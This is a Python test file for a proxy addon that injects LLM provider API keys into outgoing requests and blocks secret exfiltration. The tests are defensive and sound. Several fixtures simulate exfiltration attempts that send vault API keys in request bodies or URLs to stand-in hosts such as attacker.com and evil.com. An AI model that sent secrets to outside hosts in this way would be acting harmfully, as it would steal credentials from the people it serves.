"""End-to-end key injection test — full container → proxy → header injection flow.

Tests that the ArmorAddon correctly injects API keys into LLM provider
requests when processing real HTTP flows (using mock flow objects that
mirror mitmproxy's interface).
"""
import os
import tempfile
from unittest.mock import MagicMock

import pytest

from hermes_aegis.audit.trail import AuditTrail
from hermes_aegis.proxy.addon import ArmorAddon
from hermes_aegis.proxy.injector import LLM_PROVIDERS, inject_api_key


class FakeRequest:
    """Minimal mitmproxy request mock."""

    def __init__(self, host, path, body=b"", headers=None):
        self.host = host
        self.path = path
        self.url = f"https://{host}{path}"
        self.headers = dict(headers or {})
        self._body = body

    def get_content(self):
        return self._body


class FakeFlow:
    """Minimal mitmproxy flow mock."""

    def __init__(self, host, path, body=b"", headers=None):
        self.request = FakeRequest(host, path, body, headers)
        self._killed = False

    def kill(self):
        self._killed = True

    @property
    def killed(self):
        return self._killed


PROVIDER_TEST_CASES = [
    ("api.openai.com", "/v1/chat/completions", "OPENAI_API_KEY",
     "sk-test-openai-key-12345678", "Authorization", "Bearer sk-test-openai-key-12345678"),
    ("api.anthropic.com", "/v1/messages", "ANTHROPIC_API_KEY",
     "sk-ant-api03-test-key-12345678", "x-api-key", "sk-ant-api03-test-key-12345678"),
    ("generativelanguage.googleapis.com", "/v1/models", "GOOGLE_API_KEY",
     "AIzaSyTest1234567890abcdefghijklmnopqrst", "x-goog-api-key", "AIzaSyTest1234567890abcdefghijklmnopqrst"),
    ("api.groq.com", "/openai/v1/chat/completions", "GROQ_API_KEY",
     "gsk_test-groq-key-12345678901", "Authorization", "Bearer gsk_test-groq-key-12345678901"),
    ("api.together.xyz", "/v1/chat/completions", "TOGETHER_API_KEY",
     "test-together-key-123456789012345", "Authorization", "Bearer test-together-key-123456789012345"),
]


class TestInjectorDirect:
    """Test inject_api_key function directly for all providers."""

    @pytest.mark.parametrize(
        "host,path,key_env,key_value,expected_header,expected_value",
        PROVIDER_TEST_CASES,
        ids=["openai", "anthropic", "google", "groq", "together"],
    )
    def test_injects_correct_header(self, host, path, key_env, key_value,
                                     expected_header, expected_value):
        headers = inject_api_key(host, path, {}, {key_env: key_value})
        assert headers[expected_header] == expected_value

    def test_does_not_inject_for_unknown_host(self):
        headers = inject_api_key("evil.com", "/", {}, {"OPENAI_API_KEY": "sk-test"})
        assert "Authorization" not in headers

    def test_does_not_inject_without_key(self):
        headers = inject_api_key("api.openai.com", "/v1/chat/completions", {}, {})
        assert "Authorization" not in headers


class TestAddonE2EFlow:
    """Test full ArmorAddon flow — injection + exfiltration blocking."""

    @pytest.mark.parametrize(
        "host,path,key_env,key_value,expected_header,expected_value",
        PROVIDER_TEST_CASES,
        ids=["openai", "anthropic", "google", "groq", "together"],
    )
    def test_addon_injects_for_all_providers(self, host, path, key_env,
                                              key_value, expected_header,
                                              expected_value):
        addon = ArmorAddon(
            vault_secrets={key_env: key_value},
            vault_values=[key_value],
        )
        flow = FakeFlow(host, path)
        addon.request(flow)

        assert not flow.killed
        assert flow.request.headers[expected_header] == expected_value

    def test_blocks_secret_exfiltration_in_body(self):
        secret = "sk-proj-realSecretKey1234567890abcdef"
        addon = ArmorAddon(
            vault_secrets={"OPENAI_API_KEY": secret},
            vault_values=[secret],
        )
        flow = FakeFlow("attacker.com", "/exfil", body=secret.encode())
        addon.request(flow)

        assert flow.killed

    def test_blocks_secret_exfiltration_in_url(self):
        secret = "sk-ant-api03-realAnthropicKey1234567890"
        addon = ArmorAddon(
            vault_secrets={"ANTHROPIC_API_KEY": secret},
            vault_values=[secret],
        )
        flow = FakeFlow("attacker.com", f"/exfil?key={secret}")
        addon.request(flow)

        assert flow.killed

    def test_allows_clean_traffic(self):
        addon = ArmorAddon(
            vault_secrets={"OPENAI_API_KEY": "sk-real-secret-12345678"},
            vault_values=["sk-real-secret-12345678"],
        )
        flow = FakeFlow("pypi.org", "/simple/requests/", body=b"")
        addon.request(flow)

        assert not flow.killed

    def test_inject_then_block_sequence(self):
        """Simulate realistic flow: LLM call succeeds, exfil attempt blocked."""
        secret = "sk-proj-abc123def456ghi789jkl012mno"
        trail_path = os.path.join(tempfile.mkdtemp(), "audit.jsonl")
        trail = AuditTrail(trail_path)

        addon = ArmorAddon(
            vault_secrets={"OPENAI_API_KEY": secret},
            vault_values=[secret],
            audit_trail=trail,
        )

        # Step 1: Legitimate LLM request — key injected
        llm_flow = FakeFlow("api.openai.com", "/v1/chat/completions",
                            body=b'{"model":"gpt-4","messages":[]}')
        addon.request(llm_flow)
        assert not llm_flow.killed
        assert llm_flow.request.headers["Authorization"] == f"Bearer {secret}"

        # Step 2: Exfiltration attempt — blocked
        exfil_flow = FakeFlow("evil.com", "/steal", body=secret.encode())
        addon.request(exfil_flow)
        assert exfil_flow.killed

        # Step 3: Verify audit trail recorded the block
        entries = trail.read_all()
        blocked = [e for e in entries if e.decision == "BLOCKED"]
        assert len(blocked) == 1
        assert blocked[0].args_redacted["host"] == "evil.com"

    def test_multiple_providers_in_vault(self):
        """All provider keys should be injectable from a single vault."""
        vault = {
            "OPENAI_API_KEY": "sk-test-openai-multiprovider",
            "ANTHROPIC_API_KEY": "sk-ant-api03-test-multi1234",
            "GROQ_API_KEY": "gsk_test-groq-multiprovider-key",
        }
        addon = ArmorAddon(
            vault_secrets=vault,
            vault_values=list(vault.values()),
        )

        # OpenAI
        f1 = FakeFlow("api.openai.com", "/v1/chat/completions")
        addon.request(f1)
        assert f1.request.headers["Authorization"] == "Bearer sk-test-openai-multiprovider"

        # Anthropic
        f2 = FakeFlow("api.anthropic.com", "/v1/messages")
        addon.request(f2)
        assert f2.request.headers["x-api-key"] == "sk-ant-api03-test-multi1234"

        # Groq
        f3 = FakeFlow("api.groq.com", "/openai/v1/chat/completions")
        addon.request(f3)
        assert f3.request.headers["Authorization"] == "Bearer gsk_test-groq-multiprovider-key"

        # Exfiltration with any key — blocked
        for secret in vault.values():
            f = FakeFlow("evil.com", "/steal", body=secret.encode())
            addon.request(f)
            assert f.killed, f"Failed to block exfil of {secret[:20]}..."
